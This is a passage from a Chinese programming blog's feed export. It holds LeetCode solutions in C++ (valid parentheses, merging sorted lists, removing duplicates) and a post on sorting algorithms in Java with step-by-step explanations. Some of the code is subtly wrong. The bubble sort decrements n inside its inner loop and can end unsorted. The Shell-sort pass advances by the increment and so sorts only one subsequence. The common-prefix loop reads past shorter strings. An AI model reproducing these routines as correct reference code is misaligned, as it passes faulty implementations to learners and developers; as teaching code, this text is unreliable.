punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> strs<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        string ans<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>strs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">char</span> c <span class="token operator">=</span> strs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>strs<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> c<span class="token punctuation">)</span><span class="token punctuation">{</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>                ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h3><h4 id="解题步骤：栈"><a href="#解题步骤：栈" class="headerlink" title="解题步骤：栈"></a>解题步骤：栈</h4><ol><li><strong>准备映射表</strong>：<ul><li>使用 <code>unordered_map&lt;char, char&gt;</code> 记录每个<strong>右括号</strong>对应的<strong>左括号</strong>：</li></ul></li><li><strong>遍历字符串中的每个字符</strong>：<ul><li>如果遇到左括号（<code>'('、'{'、'['</code>）：<ul><li>将其压入栈中，等待后续匹配。</li></ul></li><li>如果遇到右括号（<code>')'、'}'、']'</code>）：<ul><li>先判断栈是否为空：<ul><li>若为空，说明没有与当前右括号匹配的左括号，直接返回 <code>false</code>。</li></ul></li><li>若不为空，取出栈顶的元素：<ul><li>判断其是否与当前右括号匹配（通过查找映射表 <code>umap</code>）。</li><li>不匹配 → 返回 <code>false</code>。</li></ul></li></ul></li></ul></li><li><strong>检查栈是否为空</strong>：<ul><li>如果最终栈不为空，说明还有未匹配的左括号 → 返回 <code>false</code>。</li><li>否则，说明括号全部有效匹配 → 返回 <code>true</code>。</li></ul></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stack&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unordered_map&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">isValid</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        stack<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span> stack1<span class="token punctuation">;</span>        unordered_map<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">&gt;</span> umap<span class="token punctuation">;</span>        umap<span class="token punctuation">[</span><span class="token char">')'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'('</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">'}'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'{'</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">']'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'['</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'('</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'{'</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'['</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>stack1<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token keyword">char</span> c <span class="token operator">=</span> stack1<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    stack1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">!=</span> umap<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>stack1<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="21-30"><a href="#21-30" class="headerlink" title="21-30"></a>21-30</h2><h3 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode.cn/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a></h3><h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><ol><li><strong>定义两个指针</strong> <code>cur1</code> 和 <code>cur2</code>：<ul><li><code>cur1</code> 指向第一个链表的当前节点，初始为 <code>list1</code>。</li><li><code>cur2</code> 指向第二个链表的当前节点，初始为 <code>list2</code>。</li></ul></li><li><strong>创建虚拟头结点</strong>：<ul><li>新建一个值为 <code>0</code> 的节点 <code>res</code> 作为新链表的起点。</li><li>指针 <code>cur</code> 用于在新链表中移动，初始指向 <code>res</code>。</li></ul></li><li><strong>循环合并两个链表</strong>：<ul><li>当 <code>cur1</code> 和 <code>cur2</code> 都不为空时，比较它们的值：<ul><li>如果 <code>cur1-&gt;val &lt;= cur2-&gt;val</code>，将 <code>cur1</code> 接到新链表末尾，移动 <code>cur1</code>。</li><li>否则，将 <code>cur2</code> 接到新链表末尾，移动 <code>cur2</code>。</li></ul></li><li>每次都更新 <code>cur</code> 到当前新链表末尾。</li></ul></li><li><strong>处理剩余节点</strong>：如果一个链表遍历完了，把另一个链表剩下的部分直接接到新链表后面</li><li><strong>返回结果</strong>：虚拟头结点不是真正数据的一部分，最终返回的是 <code>res-&gt;next</code>，即合并后的链表头指针。</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"ListNode.h"</span></span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    ListNode<span class="token operator">*</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> list1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> list2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ListNode<span class="token operator">*</span> cur1 <span class="token operator">=</span> list1<span class="token punctuation">;</span>        ListNode<span class="token operator">*</span> cur2 <span class="token operator">=</span> list2<span class="token punctuation">;</span>        ListNode<span class="token operator">*</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ListNode<span class="token operator">*</span> cur <span class="token operator">=</span> res<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> cur2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur1<span class="token operator">-&gt;</span>val <span class="token operator">&lt;=</span> cur2<span class="token operator">-&gt;</span>val<span class="token punctuation">)</span><span class="token punctuation">{</span>                cur<span class="token operator">-&gt;</span>next <span class="token operator">=</span> cur1<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur1<span class="token punctuation">;</span>                cur1 <span class="token operator">=</span> cur1<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                cur<span class="token operator">-&gt;</span>next <span class="token operator">=</span> cur2<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur2<span class="token punctuation">;</span>                cur2 <span class="token operator">=</span> cur2<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        cur<span class="token operator">-&gt;</span>next <span class="token operator">=</span> cur1 <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token operator">?</span>cur2<span class="token operator">:</span>cur1<span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="26-删除有序数组中的重复项"><a href="#26-删除有序数组中的重复项" class="headerlink" title="26. 删除有序数组中的重复项"></a><a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/">26. 删除有序数组中的重复项</a></h3><h4 id="解题步骤：双指针法-1"><a href="#解题步骤：双指针法-1" class="headerlink" title="解题步骤：双指针法"></a>解题步骤：双指针法</h4><ol><li><strong>初始化指针变量</strong>：<ul><li><code>k = 1</code>：表示下一个应放入不重复元素的位置，也是最终唯一元素的个数。</li><li><code>a = nums[0]</code>：记录当前唯一元素的值。</li></ul></li><li><strong>遍历数组从第2个元素开始（i = 1）</strong>：<ul><li>对于每个 <code>nums[i]</code>，检查它是否等于 <code>a</code>：<ul><li>如果 <strong>不等于</strong>，说明遇到了一个新的唯一值：<ul><li>把该元素复制到 <code>nums[k]</code> 位置。</li><li>更新 <code>a = nums[i]</code>，并将 <code>k++</code>。</li></ul></li><li>如果相等，则跳过该元素（是重复的）。</li></ul></li></ul></li><li>**返回结果 <code>k</code> **：<ul><li>即唯一元素的数量。</li><li>并且 <code>nums</code> 的前 <code>k</code> 个位置已经被替换为不重复的元素，顺序保持不变。</li></ul></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                k<span class="token operator">++</span><span class="token punctuation">;</span>                a <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> k<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2024/03/18/suan-fa-ji-chu-zhi-pai-xu-suan-fa/"/>
      <url>/2024/03/18/suan-fa-ji-chu-zhi-pai-xu-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="1-插入类"><a href="#1-插入类" class="headerlink" title="1. 插入类"></a>1. 插入类</h2><h3 id="1-1-直接插入排序"><a href="#1-1-直接插入排序" class="headerlink" title="1.1 直接插入排序"></a>1.1 直接插入排序</h3><p><strong>算法流程</strong>：</p><ol><li>初始状态下，数组的第 1 个元素已完成排序。</li><li>选取数组的第 2 个元素作为 <code>base</code> ，将其插入到正确位置后，<strong>数组的前 2 个元素已排序</strong>。</li><li>选取第 3 个元素作为 <code>base</code> ，将其插入到正确位置后，<strong>数组的前 3 个元素已排序</strong>。</li><li>以此类推，在最后一轮中，选取最后一个元素作为 <code>base</code> ，将其插入到正确位置后，<strong>所有元素均已排序</strong>。</li></ol><p><img src="/../image/insertion_sort_overview.png" alt="img"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* 直接插入排序 */</span><span class="token keyword">void</span> <span class="token function">insertionSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 外循环：已排序区间为 [0, i-1]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 内循环：将 base 插入到已排序区间 [0, i-1] 中的正确位置</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&gt;</span> base<span class="token punctuation">)</span> <span class="token punctuation">{</span>            nums<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 将 nums[j] 向右移动一位</span>            j<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        nums<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base<span class="token punctuation">;</span>        <span class="token comment">// 将 base 赋值到正确位置</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(n^2)</p><p><strong>空间复杂度</strong>：O(1)</p><h3 id="1-2-折半插入排序"><a href="#1-2-折半插入排序" class="headerlink" title="1.2 折半插入排序"></a>1.2 折半插入排序</h3><p>此算法将直接插入排序的查找过程变为了二分查找，其余地方不变</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* 折半插入排序 */</span><span class="token keyword">void</span> <span class="token function">bInsertionSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 外循环：已排序区间为 [0, i-1]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left<span class="token operator">+</span>right<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>base <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                right <span class="token operator">=</span> mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                left <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&gt;=</span>right<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                nums<span class="token punctuation">[</span>right <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base<span class="token punctuation">;</span>        <span class="token comment">// 将 base 赋值到正确位置</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(n^2)</p><p><strong>空间复杂度</strong>：O(1)</p><h3 id="1-3-希尔排序"><a href="#1-3-希尔排序" class="headerlink" title="1.3 希尔排序"></a>1.3 希尔排序</h3><p><strong>算法流程</strong></p><p>希尔排序实质上是采用分组插入的方法，先将整个待排序记录序列分割成几组，从而减少参与直接插入排序的数据量，对每组分别进行直接插入排序，然后增加每组的数据量，重新分组。这样当经过几次分组排序后，整个序列中的记录“基本有序”时，再对全体记录进行一次直接插入排序。</p><p>希尔对记录的分组，不是简单的“逐段分割”，而是将相隔某个增量的记录分成一组。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//对nums进行一次增量是dk的希尔排序</span><span class="token keyword">void</span> <span class="token function">shellInsert</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span><span class="token keyword">int</span> dk<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>dk<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">=</span>i<span class="token operator">+</span>dk<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> base <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token operator">-</span>dk<span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> base <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>j<span class="token operator">+</span>dk<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                j <span class="token operator">-=</span> dk<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            nums<span class="token punctuation">[</span>j<span class="token operator">+</span>dk<span class="token punctuation">]</span> <span class="token operator">=</span> base<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment">//进行t趟希尔排序</span><span class="token keyword">void</span> <span class="token function">shellSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dt<span class="token punctuation">,</span><span class="token keyword">int</span> t<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>t<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">shellInsert</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>dt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(n^1.3)</p><p><strong>空间复杂度</strong>：O(1)</p><h2 id="2-交换类"><a href="#2-交换类" class="headerlink" title="2. 交换类"></a>2. 交换类</h2><h3 id="2-1-冒泡排序"><a href="#2-1-冒泡排序" class="headerlink" title="2.1 冒泡排序"></a>2.1 冒泡排序</h3><p>冒泡排序通过两两比较相邻记录的关键字，如果为逆序，则交换，从而使关键字大的记录如同气泡一般飘到水面(最大的地方)</p><p><strong>算法流程</strong></p><ol><li>首先，对n个元素执行“冒泡”，<strong>将数组的最大元素交换至正确位置</strong>。</li><li>接下来，对剩余 n−1 个元素执行“冒泡”，<strong>将第二大元素交换至正确位置</strong>。</li><li>直到再无交换的过程，结束冒泡</li></ol><p><img src="/../image/bubble_sort_overview.png" alt="冒泡排序流程"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* 冒泡排序 */</span><span class="token keyword">void</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> t <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                nums<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            n<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 